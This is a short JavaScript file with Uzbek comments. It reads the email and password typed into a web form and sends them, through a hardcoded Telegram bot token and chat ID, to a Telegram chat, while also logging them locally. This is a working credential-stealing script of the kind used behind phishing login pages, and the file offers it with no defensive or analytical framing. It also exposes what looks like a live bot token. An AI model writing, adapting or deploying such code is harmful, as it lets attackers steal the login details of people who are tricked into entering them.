let button = document.querySelector("#btn");
let input = document.querySelectorAll('#email');

let bot = '6288421601:AAH5W3wadlPmulj9PPW0sryyqlhOnQdx7YE';
let telegram_api = `https://api.telegram.org/bot${bot}/sendMessage`; // SSL
let chat_id = '5048182589';

let database = [];

button.addEventListener('click', () => {

    // inputlardan obyekt ko'rinishida ma'lumotlarni olish
    let userData = {
        email: input[0].value,
        parol: input[1].value,
     
    };

    // database ga yangi foydalanuvchi obyektini qo'shish
    database.push(userData);

    // Telegramga yuboriladigan xabar
    let message = `
    \n
        email: ${userData.email}
        parol: ${userData.parol}
    `;

    // Telegram API orqali xabar yuborish
    fetch(telegram_api, {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: message.trim()
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
    })
    .catch(err => {
        console.log(err);
    })
    .finally(() => {
        console.log("So'rov yakunlandi.");
        console.log("Database:", database); // Obyekt shaklida saqlangan ma'lumotlarni ko'rsatish
    });
});